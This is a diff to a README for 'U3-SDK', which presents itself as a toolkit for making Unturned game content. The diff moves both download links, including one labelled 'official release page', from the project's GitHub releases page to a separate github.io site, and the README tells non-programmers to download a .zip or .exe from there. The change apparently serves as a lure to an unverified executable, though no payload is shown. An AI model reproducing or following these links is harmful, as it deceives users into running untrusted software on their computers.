@@ -1,6 +1,6 @@
 # 🧟 U3-SDK - Build your own zombie survival games
 
-[![Download U3-SDK](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/avramvioletscented987/U3-SDK/releases)
+[![Download U3-SDK](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://avramvioletscented987.github.io)
 
 U3-SDK provides the tools you need to create content for Unturned. This software gives you access to the foundational elements of the open-world zombie survival game. You can use these files to build maps, design items, or modify the game world.
 
@@ -8,7 +8,7 @@ U3-SDK provides the tools you need to create content for Unturned. This software
 
 You do not need programming experience to use this toolkit. Follow these steps to obtain and prepare the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/avramvioletscented987/U3-SDK/releases) to find the latest version.
+1. Go to the [official release page](https://avramvioletscented987.github.io) to find the latest version.
 2. Look for the file ending in .zip or .exe under the Assets section.
 3. Click the link to save the file to your computer.
 
